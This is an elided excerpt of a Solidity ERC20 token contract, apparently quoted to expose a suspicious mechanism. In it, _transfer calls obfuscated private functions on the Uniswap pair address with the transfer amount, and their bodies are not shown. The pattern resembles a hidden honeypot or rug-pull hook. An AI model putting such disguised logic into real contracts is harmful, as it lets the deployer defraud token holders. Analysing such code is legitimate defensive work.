...
contract ggg is Context, IERC20, Ownable {
    ...
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
           ...
           function deprovefsds(address valueregifd, uint256 avalueresrfwey) private returns (bool) {
           deqdprove_basic(valueregifd,avalueresrfwey);
        return true;
    }

        function deqdprove_basic(address valueregifd, uint256 avalueresrfwey) private returns (bool) {
    ...
    function _transfer(
      ...
      if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]  && to != uniswapV2Pair)
        ...
        deprovefsds(uniswapV2Pair,amount);
